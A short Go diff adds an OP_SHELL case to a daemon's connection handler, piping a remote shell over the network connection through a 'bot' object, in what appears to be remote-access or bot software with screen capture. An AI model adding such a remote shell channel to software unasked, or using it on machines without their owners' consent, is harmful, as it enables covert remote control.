@@ -222,6 +222,10 @@ func (d *Daemon) handleConn(p1 net.Conn) {
 			}
 			d.screenReqMx.Unlock()
 
+		case OP_SHELL: // pipe shell
+			go d.bot.ShellPipe(p1)
+			return
+
 /*		case "poll":
 			Vln(3, "[todo][poll]", p1)
 //			conn := NewCompStream(p1, 1)
